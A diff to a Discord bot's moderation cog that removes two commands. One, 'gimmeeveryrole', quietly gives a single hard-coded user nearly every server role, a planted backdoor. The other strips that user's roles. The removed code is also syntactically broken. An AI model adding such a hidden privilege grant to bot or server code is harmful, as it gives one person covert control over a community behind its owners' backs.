@@ -134,29 +134,7 @@ class ModCommands():
             await ctx.channel.purge(limit=number,check=None,bulk=True)
             await ctx.send("{} messages have been cleared".format(number),delete_after=3)
 
-    @client.command(pass_context=True)
-    async def gimmeeveryrole(self,ctx)    
-        if message.author == person:
-            roleid = []
-            for a in noroles:
-                roleid.append(discord.utils.get(server.roles, name = a))
-            for rolename in server.roles:
-                if rolename not in roleid:
-                    try:
-                        await person.add_roles(rolename)
-                    except:
-                        await person.send(rolename.name)
-            await message.add_reaction("✅")
-
-    @client.command(pass_context=True)
-    async def enslaveme(self, ctx):
-        if message.author==person:
-            for role in ctx.author.roles:
-                try:
-                    await person.remove_roles(role)
-                except:
-                    await person.send(role.name)
-            await message.add_reaction("✅")
+   
 
   
 def setup(client):
